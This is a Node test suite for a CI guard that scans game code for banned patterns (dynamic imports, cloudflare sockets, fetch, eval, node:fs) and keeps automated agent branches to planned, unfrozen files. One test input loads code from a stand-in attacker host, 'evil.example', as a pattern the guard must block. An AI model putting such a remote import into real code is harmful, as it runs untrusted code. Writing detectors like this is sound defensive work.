// Run: node --test scripts/guard.test.mjs (wired into @tcg/server's test script).
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync, spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { scanSource, planFiles, checkDiff, isAgentBranch, currentBranch } from "./guard.mjs";

const GUARD = fileURLToPath(new URL("./guard.mjs", import.meta.url));
const blocked = (src) => scanSource("x.ts", src).length > 0;

test("bans every import( form", () => {
  assert.ok(blocked(`const m = await import("./rules.js");`));
  assert.ok(blocked(`import("https://evil.example/x.js")`));
  assert.ok(blocked("import(`./${name}`)"));
  assert.ok(blocked(`const m = import (x);`));
  assert.ok(!blocked(`const v = import.meta.env.VITE_X;`));
  assert.ok(!blocked(`import { tick } from "@tcg/shared";`));
});

test("bans cloudflare: imports in any form", () => {
  assert.ok(blocked(`import { connect } from "cloudflare:sockets";`));
  assert.ok(blocked(`import "cloudflare:workers";`));
  assert.ok(blocked(`export { env } from 'cloudflare:workers';`));
  assert.ok(blocked("const s = `cloudflare:sockets`;"));
});

test("import allowlist covers side-effect and re-export imports", () => {
  assert.ok(blocked(`import "lodash";`));
  assert.ok(blocked(`export * from "lodash";`));
  assert.ok(!blocked(`import "./style.js";\nexport * from "./rules.js";`));
});

test("games may import the frozen kit, nothing under it", () => {
  assert.ok(!blocked(`import { Particles, drawGlow, type Fx } from "@tcg/kit";`));
  assert.ok(blocked(`import { x } from "@tcg/kit-evil";`));
  assert.ok(blocked(`import { x } from "@tcg/kitchen";`));
});

test("keeps the existing denials", () => {
  assert.ok(blocked(`fetch("https://x")`));
  assert.ok(!blocked(`await stub.fetch(req)`));
  assert.ok(!blocked(`export default {\n  async fetch(req: Request) { return new Response(); }\n};`));
  assert.ok(blocked(`eval("1")`));
  assert.ok(blocked(`import fs from "node:fs";`));
});

test("planFiles reads files from every task", () => {
  const plan = planFiles(JSON.stringify([
    { id: "t1", title: "a", estMin: 5, done: true, files: ["packages/games/g/rules.ts", "./packages/games/g/rules.test.ts"] },
    { id: "t2", title: "b", estMin: 5, done: false },
  ]));
  assert.deepEqual(plan, ["packages/games/g/rules.ts", "packages/games/g/rules.test.ts"]);
  assert.throws(() => planFiles(`{"tasks": []}`));
});

test("checkDiff: plan coverage, no per-game file cap", () => {
  const plan = ["packages/games/g/rules.ts", "packages/games/g/config.ts", "packages/games/g/assets.ts"];
  assert.deepEqual(checkDiff(plan, plan), []); // 3 impl files in one game dir is fine now
  const [err] = checkDiff(["packages/games/g/rules.ts", "packages/games/g/sneaky.ts"], plan);
  assert.match(err, /not in committed tasks\.json plan: packages\/games\/g\/sneaky\.ts$/);
  assert.match(checkDiff(["packages/games/g/rules.ts"], null)[0], /no tasks\.json at HEAD/);
  // directory entries (bootstrap task creates the whole game dir)
  assert.deepEqual(checkDiff(["packages/games/new/a.ts", "packages/games/new/sub/b.ts"], ["packages/games/new/"]), []);
  assert.equal(checkDiff(["packages/games/newer/a.ts"], ["packages/games/new"]).length, 1);
  // files outside packages/games/ are not subject to the plan check
  assert.deepEqual(checkDiff(["tasks.json", "apps/server/src/worker.ts"], []), []);
});

test("checkDiff: frozen files, including kit and streamer", () => {
  for (const f of ["packages/shared/src/sim/physics.ts", "packages/kit/src/camera.ts", "apps/streamer/run.sh", "apps/server/src/room.ts", "apps/client/src/net.ts", ".github/workflows/ci.yml"]) {
    assert.match(checkDiff([f], [f])[0] ?? "", /changed frozen/, f);
  }
  assert.deepEqual(checkDiff(["packages/shared/package.json", "apps/server/src/roomy.ts"], []), []);
});

test("branch resolution and agent-branch detection", () => {
  assert.equal(currentBranch({ GITHUB_HEAD_REF: "f/1-x", GITHUB_REF_NAME: "12/merge" }), "f/1-x");
  assert.equal(currentBranch({ GITHUB_HEAD_REF: "", GITHUB_REF_NAME: "f/2-y" }), "f/2-y");
  assert.ok(isAgentBranch("f/3-z"));
  for (const b of ["main", "claude/infra", "feature/f/x", "HEAD"]) assert.ok(!isAgentBranch(b), b);
});

function fixture() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "guard-"));
  const g = (...a) => execFileSync("git", a, { cwd: dir, stdio: "pipe" });
  const write = (f, s) => { fs.mkdirSync(path.dirname(path.join(dir, f)), { recursive: true }); fs.writeFileSync(path.join(dir, f), s); };
  // CI sets GITHUB_* for the outer run; the fixture resolves its branch from git unless given one.
  const run = (env = {}) => {
    const e = { ...process.env, GUARD_BASE: "base", ...env };
    if (!("GITHUB_HEAD_REF" in env)) delete e.GITHUB_HEAD_REF;
    if (!("GITHUB_REF_NAME" in env)) delete e.GITHUB_REF_NAME;
    return spawnSync(process.execPath, [GUARD], { cwd: dir, encoding: "utf8", env: e });
  };
  g("init", "-q", "-b", "main");
  g("config", "user.email", "t@t"); g("config", "user.name", "t");
  write("packages/games/g/rules.ts", "export const a = 1;\n");
  write("apps/server/src/room.ts", "export const r = 1;\n");
  write("tasks.json", "[]");
  g("add", "-A"); g("commit", "-qm", "base"); g("branch", "base");
  return { dir, g, write, run, done: () => fs.rmSync(dir, { recursive: true, force: true }) };
}

test("f/ branch touching a frozen file fails; non-f/ branch passes", () => {
  const f = fixture();
  try {
    f.write("apps/server/src/room.ts", "export const r = 2;\n");
    f.g("commit", "-qam", "infra");
    let r = f.run();
    assert.equal(r.status, 0, r.stdout + r.stderr); // on "main"
    assert.match(r.stdout, /not an agent branch/);
    r = f.run({ GITHUB_REF_NAME: "claude/infra" });
    assert.equal(r.status, 0, r.stdout + r.stderr);

    f.g("checkout", "-qb", "f/1-feature");
    r = f.run();
    assert.equal(r.status, 1, r.stdout + r.stderr);
    assert.match(r.stderr, /changed frozen: apps\/server\/src\/room\.ts/);
    // pull_request head ref wins over the merge ref name
    r = f.run({ GITHUB_HEAD_REF: "f/1-feature", GITHUB_REF_NAME: "7/merge" });
    assert.equal(r.status, 1);
  } finally { f.done(); }
});

test("content checks still run on non-f/ branches", () => {
  const f = fixture();
  try {
    f.write("packages/games/g/rules.ts", `export const m = import("./x.js");\n`);
    f.g("commit", "-qam", "bad");
    const r = f.run();
    assert.equal(r.status, 1, r.stdout + r.stderr);
    assert.match(r.stderr, /blocked pattern/);
  } finally { f.done(); }
});

test("f/ branch: unplanned game file fails; plan read from HEAD via GUARD_BASE", () => {
  const f = fixture();
  try {
    f.g("checkout", "-qb", "f/2-feature");
    f.write("packages/games/g/rules.ts", "export const a = 2;\n");
    f.write("packages/games/g/config.ts", "export const b = 2;\n");
    f.write("tasks.json", JSON.stringify([{ id: "t1", files: ["packages/games/g/rules.ts"] }]));
    f.g("add", "-A"); f.g("commit", "-qm", "feature");
    let r = f.run();
    assert.equal(r.status, 1, r.stdout + r.stderr);
    assert.match(r.stderr, /not in committed tasks\.json plan: packages\/games\/g\/config\.ts/);

    // An uncommitted plan edit does not count.
    f.write("tasks.json", JSON.stringify([{ id: "t1", files: ["packages/games/g/rules.ts", "packages/games/g/config.ts"] }]));
    assert.equal(f.run().status, 1);
    f.g("commit", "-qam", "plan");
    r = f.run();
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /guard ok/);
  } finally { f.done(); }
});
